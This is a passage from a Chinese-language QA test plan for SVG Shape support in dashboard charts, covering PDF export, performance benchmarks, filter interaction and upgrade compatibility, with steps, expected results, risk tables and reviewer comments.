导出包含 SVG Shape 的 Chart 为 PDF，验证导出结果、SVG 显示和文件大小

**前置条件（Pre-condition）**
- 创建包含 SVG Shape 的 Chart（100+ 数据点）
- 验证 Chart 在浏览器中正确显示

**关键步骤（Key Steps）**

1. **测试 1：单个 Chart 导出**
   - 右键点击 Chart → 导出为 PDF
   - 验证导出成功，文件生成
   - 打开 PDF，验证 SVG Shape 显示正确（应栅格化）
   - 验证 PDF 大小合理（不应异常大）

2. **测试 2：Dashboard 导出**
   - Dashboard 包含多个包含 SVG Shape 的 Chart
   - 导出整个 Dashboard 为 PDF
   - 验证所有 SVG Shape 都正确显示

3. **测试 3：复杂 SVG 导出**
   - 应用复杂 SVG（多层、渐变），导出为 PDF
   - 验证 SVG 复杂度不影响导出成功率
   - 验证 PDF 中 SVG 细节保留

4. **测试 4：大数据集导出**
   - Chart 包含 1000+ SVG Shape 数据点
   - 导出为 PDF
   - 验证导出成功，无超时或内存溢出
   - 监控导出时间（应 < 30s）

5. **测试 5：导出失败处理**
   - 模拟导出异常（如：磁盘满、权限不足）
   - 验证用户收到清晰的错误提示
   - 验证不会产生损坏的 PDF 文件

6. **测试 6：导出格式对比**
   - 同一 Chart 导出为 PDF 和 PNG
   - 比对 SVG Shape 在两种格式中的显示效果
   - 验证一致性

**预期结果（Expected Result）**

✅ 导出成功，PDF 生成正确  
✅ SVG Shape 在 PDF 中显示清晰  
✅ 导出时间合理（< 30s）  
✅ PDF 文件大小合理  
✅ 错误处理友好  
✅ 大数据集导出不失败

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | ��证点 |
|------|---------|--------|
| 导出失败 | 各种 Chart 和 SVG | 100% 导出成功 |
| 性能问题 | 大数据集导出 | 时间 < 30s |
| 文件质量 | PDF 内容验证 | SVG 清晰显示 |
| 错误处理 | 导出异常模拟 | 用户提示清晰 |

---

### 测试场景 6：SVG 性能基准测试  **测试-分析**: 需简化

**测试目标（Scenario Objective）**  
验证 SVG 在大数据集场景下的渲染性能，确保不低于光栅 Shape

**风险级别（Risk Level）**  
🟡 **Medium** – 性能问题导致 DoS 和用户体验差

**测试场景描述**  
逐步增加 Chart 数据点，测量 SVG 和光栅 Shape 的加载时间、内存占用和帧率

**前置条件（Pre-condition）**
- 准备相同内容的 SVG 和 PNG Shape（如：同一图标）
- 浏览器：Chrome 最新版本，开启 DevTools Performance 监控
- 测试环境：固定硬件配置（CPU、内存、网络）

**关键步骤（Key Steps）**

1. **测试 1：100 数据点基准**
   - 创建散点 Chart，100 个数据点，应用 SVG Shape
   - 记录加载时间（首屏显示时间）
   - 记录内存占用（DevTools Memory）
   - 目标：加载时间 < 200ms

2. **测试 2：500 数据点基准**
   - 同上，500 个数据点
   - 目标：加载时间 < 1s

3. **测试 3：1000 数据点基准**
   - 同上，1000 个数据点
   - 目标：加载时间 < 2s
   - 记录帧率（FPS）

4. **测试 4：5000 数据点压力测试**
   - 5000 个数据点
   - 验证系统是否卡顿或崩溃
   - 如果卡顿，建议启用虚拟化渲染

5. **测试 5：SVG vs 光栅对比**
   - 同一 Chart，分别使用 SVG 和 PNG Shape
   - 对比加载时间、内存、帧率
   - SVG 性能不应显著低于光栅

6. **测试 6：交互性能**
   - 大数据集 Chart（1000+ 点），应用 SVG Shape
   - 验证鼠标悬停 Tooltip 响应延迟 < 100ms
   - 验证缩放、拖拽操作帧率 > 30fps

7. **测试 7：缓存效率**
   - 多次加载同一 SVG Shape
   - 验证第二次加载显著快于第一次（缓存生效）
   - 记录缓存命中率

**预期结果（Expected Result）**

✅ 100 点：加载时间 < 200ms  
✅ 500 点：加载时间 < 1s  
✅ 1000 点：加载时间 < 2s  
✅ 内存占用合理，无内存泄漏  
✅ 帧率 > 30fps，交互流畅  
✅ 缓存命中率 > 80%  
✅ SVG 性能与光栅基本相当或更优

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| 渲染卡顿 | 大数据集加载测试 | 时间达标 |
| 内存溢出 | 内存占用监控 | 无内存泄漏 |
| 交互延迟 | 交互性能测试 | 响应 < 100ms |
| 缓存问题 | 重复加载 | 命中率 > 80% |

---

### 测试场景 7：SVG + Chart Filter 组合验证  **测试-分析**: 可行，不错

**测试目标（Scenario Objective）**  
验证 SVG Shape 与 Chart Filter 操作无冲突，Filter 应用后 SVG 数据正确更新

**风险级别（Risk Level）**  
🟡 **Medium** – Filter 失效或 SVG 错乱影响数据准确性

**测试场景描述**  
在包含 SVG Shape 的 Chart 上应用多种 Filter，验证 SVG 显示和数据一致性

**前置条件（Pre-condition）**
- 创建包含多个维度和指标的 Chart（如：按地区和销售额）
- 应用 SVG Shape 代表不同数据点
- 添加 Filter 控件（如：地区下拉框）

**关键步骤（Key Steps）**

1. **测试 1：简单 Filter 应用**
   - Chart 显示所有数据，SVG Shape 正确显示
   - 从 Filter 下拉框选择 "华东地区"
   - 验证 Chart 只显示华东地区数据
   - 验证 SVG Shape 数量和颜色正确更新
   - 验证过滤后的 SVG Shape 位置正确

2. **测试 2：多条件 Filter**
   - 同时应用地区和销售额范围 Filter
   - 验证 Chart 和 SVG Shape 都正确过滤
   - 验证 SVG 数据与 Filter 条件一致

3. **测试 3：Filter 清除**
   - 应用 Filter 后，清除 Filter
   - 验证 Chart 恢复完整数据
   - 验证 SVG Shape 数量和排列恢复原样

4. **测试 4：Filter 切换**
   - 快速切换 Filter 值（如：地区从 "华东" → "华北" → "华东"）
   - 验证 SVG Shape 正确跟随切换
   - 验证无数据混乱或 SVG 残留

5. **测试 5：Filter 交互延迟**
   - 记录 Filter 应用到 SVG 更新的时间间隔
   - 目标：延迟 < 500ms（用户无感知）

6. **测试 6：大数据集 Filter**
   - Chart 原始数据 10000+ 行
   - 应用 SVG Shape
   - 应用 Filter 过滤到 100 行
   - 验证过滤和 SVG 更新成功

**预期结果（Expected Result）**

✅ Filter 应用后 SVG Shape 正确更新  
✅ 过滤数据与 SVG 显示一致  
✅ Filter 切换无 SVG 数据混乱  
✅ 交互延迟 < 500ms  
✅ 大数据集过滤不失败

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| Filter 失效 | 各种 Filter 条件 | 100% 生效 |
| SVG 数据不同步 | 过滤前后数据对比 | 完全同步 |
| 交互延迟 | 时间测量 | < 500ms |
| 大数据处理 | 10000+ 行过滤 | 成功无失败 |

---

### 🟢 P2 - 低优先级场景

---

### 测试场景 8：SVG 版本升级兼容性   **测试-分析**: 对于下个版本可行，目前新增加可忽略版本兼容

**测试目标（Scenario Objective）**  
验证旧版本 Dashboard（创建于 SVG 支持前）升级后能正确加载 SVG Shape，或有合理 Fallback

**风险级别（Risk Level）**  
🟢 **Low** – 但影响用户升级体验

**测试场景描述**  
模拟从不支持 SVG 的旧版本升级到新版本，验证数据迁移和向后兼容性

**前置条件（Pre-condition）**
- 准备旧版本数据库备份（不含 SVG Shape）
- 新版本部署完成

**关键步骤（Key Steps）**

1. **测试 1：旧版本 Dashboard 加载**
   - 恢复旧版本数据
   - 在新版本中打开旧 Dashboard（仅包含 JPG/PNG Shape）
   - 验证 Chart 正常显示，Shape 无缺失

2. **测试 2：混合 Shape 显示**
   - 旧 Dashboard 中的 JPG/PNG Shape 正常显示
   - 新增 SVG Shape 到同一 Chart
   - 验证两种 Shape 并行显示无冲突

3. **测试 3：新版本创建的 SVG 回滚**
   - 在新版本中创建包含 SVG Shape 的 Chart
   - 回滚到旧版本
   - 验



